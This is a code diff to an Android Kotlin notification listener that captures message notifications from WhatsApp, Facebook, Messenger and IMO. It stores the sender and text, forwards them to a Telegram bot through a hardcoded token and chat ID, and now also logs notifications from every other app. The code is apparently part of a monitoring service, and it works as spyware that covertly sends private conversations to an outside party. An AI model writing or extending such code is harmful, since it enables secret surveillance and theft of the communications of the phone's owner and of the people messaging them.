@@ -23,31 +23,46 @@ class WhatsAppListener : NotificationListenerService() {
         sbn ?: return
         val pkg = sbn.packageName ?: return
 
+        // Own app skip
+        if (pkg == packageName) return
+
         val app = when (pkg) {
             "com.whatsapp", "com.whatsapp.w4b" -> "whatsapp"
             "com.facebook.katana", "com.facebook.orca" -> "fb"
             "com.imo.android.imoim", "com.imo.android.imoimbeta" -> "imo"
-            else -> return
+            else -> "other"
         }
 
         val extras = sbn.notification?.extras ?: return
         val title = extras.getString(Notification.EXTRA_TITLE) ?: return
         val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: return
 
-        if (title == text) return
+        if (title == text && title.isBlank()) return
 
-        MessageStore.addMessage(this, app, title, text)
-
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
-                val emoji = when (app) {
+        // WhatsApp/FB/IMO → store + send
+        if (app != "other") {
+            MessageStore.addMessage(this, app, title, text)
+            sendTelegram("${
+                when (app) {
                     "whatsapp" -> "💬"
                     "fb" -> "📘"
                     "imo" -> "📱"
                     else -> "📩"
                 }
-                val msg = "$emoji ${app.uppercase()}\nFrom: $title\n$text"
+            } ${app.uppercase()}\nFrom: $title\n$text")
+        } else {
+            // අනිත් notifications → Notification History
+            MessageStore.addNotification(this, pkg, title, text)
+            // Auto-notify නෑ — ෆෝන් එකේ ගොඩක් notifications එන නිසා
+        }
+    }
+
+    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
+
+    private fun sendTelegram(msg: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
                 val json = JSONObject().apply {
                     put("chat_id", MonitoringService.CHAT_ID)
                     put("text", msg)
@@ -57,6 +72,4 @@ class WhatsAppListener : NotificationListenerService() {
             } catch (_: Exception) {}
         }
     }
-
-    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
-}
+                         }
